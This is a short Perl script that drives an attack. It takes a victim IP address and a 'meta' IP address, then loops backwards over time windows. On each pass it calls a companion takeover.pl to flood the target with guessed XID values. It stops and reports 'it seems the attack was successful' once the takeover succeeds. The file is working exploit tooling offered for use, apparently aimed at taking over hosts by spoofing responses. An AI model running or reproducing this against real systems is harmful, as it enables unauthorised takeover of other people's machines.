#!/usr/bin/perl

use strict;
use warnings;
use FindBin qw($Bin);

my $victim_ip = shift @ARGV;
my $meta_ip = shift @ARGV;

die "Usage: $0 victim-ip-address meta-ip-address\n" if(!$meta_ip);

my $mode = $ENV{MODE} || "ack";
my $window_sec = ($ENV{ONESHOT_WINDOW_MIN} || 1440)*60;

my $max_ts = time();

while(1) {
   my $a_max_ts = $max_ts - 1;
   my $a_min_ts = $max_ts - $window_sec;

   print "Flooding destination between with XIDs between $a_min_ts and $a_max_ts\n";
   my $rc = system("$Bin/takeover.pl $mode $victim_ip $meta_ip $a_min_ts $a_max_ts");
   if((!$rc) && (!$ENV{DONT_STOP})) {
      print "it seems the attack was successful\n";
      exit(0);
   }

   $max_ts = $a_min_ts;
}

